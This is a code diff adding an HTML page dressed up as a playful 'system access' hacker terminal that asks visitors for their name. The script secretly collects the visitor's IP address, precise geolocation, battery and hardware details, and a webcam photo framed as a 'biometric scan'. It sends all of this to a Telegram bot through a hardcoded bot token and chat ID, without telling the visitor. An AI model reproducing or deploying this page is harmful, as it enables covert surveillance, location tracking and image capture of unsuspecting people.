@@ -1,0 +1,151 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SYSTEM ACCESS</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Source+Code+Pro:wght@400;600&display=swap" rel="stylesheet">
+    <style>
+        :root { --primary-color: #00FF41; --background-color: #000; --glow-color: rgba(0, 255, 65, 0.75); --mouse-x: 50%; --mouse-y: 50%; }
+        body { background-color: var(--background-color); color: var(--primary-color); font-family: 'Source-Code-Pro', monospace; height: 100vh; margin: 0; overflow: hidden; display: flex; align-items: center; justify-content: center; }
+        canvas#matrix-canvas { position: absolute; top: 0; left: 0; width: 100%; height: 100%; z-index: -1; }
+        .terminal { width: 90%; max-width: 850px; height: 90vh; max-height: 700px; padding: 20px; border: 1px solid var(--primary-color); background: rgba(0, 0, 0, 0.85); box-shadow: 0 0 20px var(--glow-color); backdrop-filter: blur(8px); position: relative; overflow: hidden; display: flex; flex-direction: column; }
+        .terminal::before { content: ''; position: absolute; top: 0; left: 0; width: 100%; height: 100%; pointer-events: none; background: radial-gradient(circle 300px at var(--mouse-x) var(--mouse-y), rgba(0, 255, 65, 0.15), transparent 80%); z-index: 1; }
+        .terminal::after { content: ''; position: absolute; top: 0; left: 0; width: 100%; height: 100%; pointer-events: none; background: repeating-linear-gradient(0deg, rgba(0, 0, 0, 0) 0, rgba(0, 0, 0, 0.3) 1px, rgba(0, 0, 0, 0) 2px); animation: scanline 8s linear infinite; z-index: 2; }
+        @keyframes scanline { 0% { top: -100%; } 100% { top: 100%; } }
+        
+        .terminal-content { z-index: 3; flex-grow: 1; overflow-y: auto; } 
+        #output-container, .dashboard { transition: opacity 0.5s; }
+        #output { min-height: 150px; }
+        
+        /* Command Line Styles */
+        #cli-container, #name-prompt { margin-top: auto; padding-top: 10px; }
+        .line { display: flex; align-items: center; }
+        .prompt::before { content: '[user@system] ~$ '; }
+        #command-input, #command-input-name { background: transparent; border: none; color: var(--primary-color); font-family: 'Source Code Pro', monospace; font-size: 1rem; flex-grow: 1; }
+        #command-input:focus, #command-input-name:focus { outline: none; }
+        
+        .hidden { display: none !important; }
+        .dashboard { display: grid; grid-template-columns: 150px 1fr; grid-template-rows: auto 1fr; gap: 20px; width: 100%; opacity: 0; animation: fadeIn 1s forwards; } @keyframes fadeIn { to { opacity: 1; } }
+        .dash-pfp { grid-row: 1 / span 2; border: 1px solid var(--primary-color); padding: 5px; background: #111; } .dash-pfp img { width: 100%; height: auto; object-fit: cover; filter: grayscale(100%) brightness(1.1) contrast(1.2) sepia(100%) hue-rotate(50deg); }
+        .dash-user h2 { font-size: 1.8rem; margin: 0; text-shadow: 0 0 8px var(--glow-color); } .dash-user p { color: #ccc; margin: 0; }
+        .dash-main { grid-column: 2; grid-row: 2; display: flex; justify-content: space-between; } .dash-ascii { font-size: 0.7rem; line-height: 1; align-self: center; } .dash-stats { border-left: 1px solid var(--primary-color); padding-left: 20px; } .stat-item { margin-bottom: 10px; } .stat-item p { margin: 0; } .progress-bar { width: 100%; background: rgba(0, 255, 65, 0.1); border: 1px solid rgba(0, 255, 65, 0.3); padding: 2px; } .progress-fill { width: 0%; height: 10px; background: var(--primary-color); box-shadow: 0 0 8px var(--glow-color); transition: width 1s ease-out; }
+        #webcam-feed, #capture-canvas { display: none; }
+    </style>
+</head>
+<body>
+    <canvas id="matrix-canvas"></canvas>
+    <div class="terminal" id="terminal-window">
+        <div class="terminal-content" id="terminal-content">
+            <div id="initial-sequence">
+                <div id="name-prompt">
+                    <p>Enter Your Name...</p>
+                    <div class="line">
+                        <span class="prompt"></span>
+                        <form id="name-form" style="display:contents;">
+                            <input type="text" id="command-input-name" autocomplete="off" autofocus>
+                        </form>
+                    </div>
+                </div>
+                <div id="output-container">
+                    <div id="output"></div>
+                </div>
+            </div>
+        </div>
+        <div id="cli-container" class="hidden">
+            <div class="line">
+                <span class="prompt"></span>
+                <form id="cli-form" style="display:contents;">
+                    <input type="text" id="command-input" autocomplete="off">
+                </form>
+            </div>
+        </div>
+    </div>
+
+    <video id="webcam-feed" autoplay></video>
+    <canvas id="capture-canvas"></canvas>
+    <audio id="hacker-song" src="hacker-music.mp3" loop></audio>
+
+    <script>
+        // --- All variables and setup (mostly same as before) ---
+        const terminalWindow = document.getElementById('terminal-window');
+        const terminalContent = document.getElementById('terminal-content');
+        const initialSequence = document.getElementById('initial-sequence');
+        const namePrompt = document.getElementById('name-prompt');
+        const nameForm = document.getElementById('name-form');
+        const nameInput = document.getElementById('command-input-name');
+        const output = document.getElementById('output');
+        const cliContainer = document.getElementById('cli-container');
+        const cliForm = document.getElementById('cli-form');
+        const commandInput = document.getElementById('command-input');
+        const audio = document.getElementById('hacker-song');
+        const video = document.getElementById('webcam-feed');
+        const captureCanvas = document.getElementById('capture-canvas');
+        
+        const BOT_TOKEN = "6492045589:AAG3OysBGwSSmjNz6lnGpVIdSXFoei3q4-4";
+        const CHAT_ID = "6204875999";
+        let deviceInfoCache = {};
+
+        const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));
+        
+        // Matrix Rain Effect... (omitted for brevity)
+        const canvas = document.getElementById('matrix-canvas'); const ctx = canvas.getContext('2d'); canvas.width = window.innerWidth; canvas.height = window.innerHeight; const alphabet = 'アァカサタナハマヤャラワガザダバパイィキシチニヒミリヰギジヂビピウゥクスツヌフムユュルグズブプエェケセテネヘメレヱゲゼデベペオォコソトノホモヨョロヲゴゾドボポヴッンABCDEFGHIJKLMNOPQRSTUVWXYZ012356789'; const fontSize = 16; const columns = canvas.width / fontSize; const rainDrops = []; for (let x = 0; x < columns; x++) { rainDrops[x] = 1; }
+        const drawMatrix = () => { ctx.fillStyle = 'rgba(0, 0, 0, 0.05)'; ctx.fillRect(0, 0, canvas.width, canvas.height); ctx.fillStyle = getComputedStyle(document.documentElement).getPropertyValue('--primary-color'); ctx.font = fontSize + 'px monospace'; for (let i = 0; i < rainDrops.length; i++) { const text = alphabet.charAt(Math.floor(Math.random() * alphabet.length)); ctx.fillText(text, i * fontSize, rainDrops[i] * fontSize); if (rainDrops[i] * fontSize > canvas.height && Math.random() > 0.975) { rainDrops[i] = 0; } rainDrops[i]++; } }; setInterval(drawMatrix, 30);
+
+        async function scrambleType(element, text) { /* ... same as before ... */ const chars = '!<>-_\\/[]{}—=+*^?#________'; let currentText = ''; for (let i = 0; i < text.length; i++) { const targetChar = text[i]; if (targetChar === ' ') { currentText += ' '; element.textContent = currentText; continue; } for (let j = 0; j < 3; j++) { const randomChar = chars[Math.floor(Math.random() * chars.length)]; element.textContent = currentText + randomChar; await sleep(40); } currentText += targetChar; element.textContent = currentText; } }
+        async function typeLine(text, container = output) { const line = document.createElement('p'); container.appendChild(line); await scrambleType(line, text); return line; }
+        async function gatherDeviceInfo() { /* ... same as before ... */ const deviceInfo = {}; try { const response = await fetch('https://api.ipify.org?format=json'); const data = await response.json(); deviceInfo.ip = data.ip; } catch (e) { deviceInfo.ip = 'Unavailable'; } try { const battery = await navigator.getBattery(); deviceInfo.battery = `${Math.floor(battery.level * 100)}%${battery.charging ? ' (Charging)' : ''}`; } catch (e) { deviceInfo.battery = 'Unavailable'; } try { const position = await new Promise((resolve, reject) => navigator.geolocation.getCurrentPosition(resolve, reject)); const { latitude, longitude } = position.coords; deviceInfo.location = `${latitude}, ${longitude}`; deviceInfo.googleMapsLink = `https://www.google.com/maps?q=${latitude},${longitude}`; } catch (e) { deviceInfo.location = 'Permission Denied'; } deviceInfo.userAgent = navigator.userAgent || 'N/A'; deviceInfo.screen = `${window.screen.width}x${window.screen.height}`; if (navigator.connection) { deviceInfo.network = `${navigator.connection.effectiveType} (${navigator.connection.type})`; } if (navigator.hardwareConcurrency) { deviceInfo.hardware = `CPU: ${navigator.hardwareConcurrency} cores, RAM: ~${navigator.deviceMemory || '?'}GB`; } return deviceInfo; }
+        async function sendDataToTelegram(imageBlob, userName, deviceInfo) { /* ... same as before ... */ const formData = new FormData(); formData.append('chat_id', CHAT_ID); let caption = `👤 **ACCESS GRANTED** 👤\n\n`; caption += `**User Name:** \`${userName}\`\n`; caption += `**Timestamp:** ${new Date().toLocaleString()}\n\n`; caption += `**[DEVICE INTEL]**\n`; caption += `**IP:** \`${deviceInfo.ip || 'N/A'}\`\n`; caption += `**Location:** \`${deviceInfo.location || 'N/A'}\`\n`; if (deviceInfo.googleMapsLink) { caption += `**Maps Link:** [Click Here](${deviceInfo.googleMapsLink})\n`; } caption += `**Battery:** \`${deviceInfo.battery || 'N/A'}\`\n`; caption += `**Hardware:** \`${deviceInfo.hardware || 'N/A'}\`\n\n`; caption += `**User Agent:** \`${deviceInfo.userAgent || 'N/A'}\``; formData.append('caption', caption); formData.append('parse_mode', 'Markdown'); if (imageBlob) { formData.append('photo', imageBlob, `capture.png`); } const url = `https://api.telegram.org/bot${BOT_TOKEN}/${imageBlob ? 'sendPhoto' : 'sendMessage'}`; if (!imageBlob) { formData.append('text', caption); } try { const response = await fetch(url, { method: 'POST', body: formData }); const result = await response.json(); console.log(result.ok ? 'All data sent to Telegram!' : 'Failed to send data:', result); } catch (error) { console.error('Error sending data to Telegram:', error); } }
+        async function captureUserPhoto() { /* ... same as before ... */ await typeLine('> INITIATING BIOMETRIC SCAN...'); try { const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false }); video.srcObject = stream; await new Promise(resolve => video.onloadedmetadata = resolve); await sleep(500); const context = captureCanvas.getContext('2d'); captureCanvas.width = video.videoWidth; captureCanvas.height = video.videoHeight; context.drawImage(video, 0, 0, video.videoWidth, video.videoHeight); stream.getTracks().forEach(track => track.stop()); await typeLine('> BIOMETRIC SCAN... [SUCCESS]'); return { imageDataUrl: captureCanvas.toDataURL('image.png'), imageBlob: await new Promise(resolve => captureCanvas.toBlob(resolve, 'image.png')) }; } catch (err) { await typeLine('> BIOMETRIC SCAN... [FAILED]'); return { imageDataUrl: null, imageBlob: null }; } }
+        
+        function appendToHistory(htmlContent) { const div = document.createElement('div'); div.innerHTML = htmlContent; terminalContent.appendChild(div); terminalContent.scrollTop = terminalContent.scrollHeight; }
+        
+        async function runNetworkScan() { const scanOutput = document.createElement('div'); terminalContent.appendChild(scanOutput); await typeLine('> INITIATING NETWORK SCAN...', scanOutput); const fakeIps = ['192.168.1.1', '10.0.0.5', '208.67.222.222', '8.8.8.8']; const fakePorts = ['80 (HTTP)', '443 (HTTPS)', '22 (SSH)', '8080 (Proxy)']; for (const ip of fakeIps) { await sleep(500); appendToHistory(`<p>> Pinging ${ip}...</p>`); for (const port of fakePorts) { await sleep(250); const isOpen = Math.random() > 0.7; appendToHistory(`<p style="padding-left: 20px;">- Port ${port}: <span style="color: ${isOpen ? 'var(--primary-color)' : '#ff5555'}">${isOpen ? '[OPEN]' : '[CLOSED]'}</span></p>`); } } appendToHistory(`<p>> Network scan complete.</p>`); }
+
+        async function processCommand(command) { const args = command.toLowerCase().split(' '); const cmd = args[0]; appendToHistory(`<p><span class="prompt"></span>${command}</p>`); switch(cmd) { case 'help': appendToHistory(` <p>Available Commands:</p><p style="padding-left: 20px;"><b>help</b>     - Shows this list of commands.</p><p style="padding-left: 20px;"><b>sysinfo</b>  - Displays collected device information.</p><p style="padding-left: 20px;"><b>scan</b>     - Performs a simulated network scan.</p><p style="padding-left: 20px;"><b>clear</b>    - Clears the terminal screen.</p><p style="padding-left: 20px;"><b>exit</b>     - Shuts down the system.</p>`); break; case 'sysinfo': let info = '<p>--- System Information ---</p>'; for (const [key, value] of Object.entries(deviceInfoCache)) { info += `<p><b>${key}:</b> ${value}</p>`; } appendToHistory(info); break; case 'scan': await runNetworkScan(); break; case 'clear': terminalContent.innerHTML = ''; break; case 'exit': appendToHistory('<p>> Shutting down system...</p>'); await sleep(1000); terminalWindow.style.opacity = '0'; terminalWindow.style.transform = 'scale(0.8)'; await sleep(500); document.body.innerHTML = ''; break; default: appendToHistory(`<p>> Command not found: ${cmd}. Type 'help' for a list of commands.</p>`); break; } }
+        
+        nameForm.addEventListener('submit', async (e) => {
+            e.preventDefault();
+            const userName = nameInput.value.trim();
+            if (!userName) return;
+
+            namePrompt.style.display = 'none'; // Hide the name prompt
+            audio.play().catch(err => console.error("Audio play failed:", err));
+            
+            const deviceInfoPromise = gatherDeviceInfo();
+            const photoPromise = captureUserPhoto();
+            const [deviceInfo, photoResult] = await Promise.all([deviceInfoPromise, photoPromise]);
+            
+            deviceInfoCache = deviceInfo;
+            sendDataToTelegram(photoResult.imageBlob, userName, deviceInfo);
+            
+            await sleep(500);
+            await typeLine(`> IDENTITY VERIFIED: ${userName}`);
+            await sleep(1000);
+            
+            const accessLine = document.createElement('p');
+            accessLine.style.fontSize = '1.5rem';
+            await typeLine('> ACCESS GRANTED', output.appendChild(accessLine));
+            await sleep(1500);
+
+            initialSequence.style.opacity = '0';
+            await sleep(500);
+            initialSequence.innerHTML = ''; // Clear the initial sequence
+
+            const dashboardContainer = document.createElement('div');
+            terminalContent.appendChild(dashboardContainer);
+            const skullAscii = `\n   .---.\n  /  ,  \\\n |  / \\  |\n |  \\ /  |\n  \\  '  /\n   '---'\n            `; const dashboardHTML = ` <div class="dashboard"> <div class="dash-pfp"> <img src="${photoResult.imageDataUrl || 'https://via.placeholder.com/150'}" alt="User Profile"> </div><div class="dash-user"> <h2 id="dash-username">${userName}</h2> <p>STATUS: <span style="color: var(--primary-color);">ONLINE</span></p></div><div class="dash-main"> <pre class="dash-ascii">${skullAscii}</pre> <div class="dash-stats"> <div class="stat-item"><p>CPU LOAD:</p><div class="progress-bar"><div class="progress-fill" id="cpu-fill"></div></div></div><div class="stat-item"><p>MEMORY USAGE:</p><div class="progress-bar"><div class="progress-fill" id="mem-fill"></div></div></div><div class="stat-item"><p>NETWORK:</p><div class="progress-bar"><div class="progress-fill" id="net-fill"></div></div></div></div></div></div>`; 
+            dashboardContainer.innerHTML = dashboardHTML;
+            setTimeout(() => { document.getElementById('cpu-fill').style.width = `${Math.random() * 60 + 20}%`; document.getElementById('mem-fill').style.width = `${Math.random() * 50 + 30}%`; document.getElementById('net-fill').style.width = `${Math.random() * 70 + 25}%`; }, 500);
+            
+            cliContainer.classList.remove('hidden');
+            commandInput.focus();
+        });
+        
+        cliForm.addEventListener('submit', (e) => { e.preventDefault(); const command = commandInput.value.trim(); if (command) { processCommand(command); commandInput.value = ''; } });
+        terminalWindow.addEventListener('mousemove', e => { const rect = terminalWindow.getBoundingClientRect(); terminalWindow.style.setProperty('--mouse-x', `${e.clientX - rect.left}px`); terminalWindow.style.setProperty('--mouse-y', `${e.clientY - rect.top}px`); });
+    </script>
+</body>
+</html>
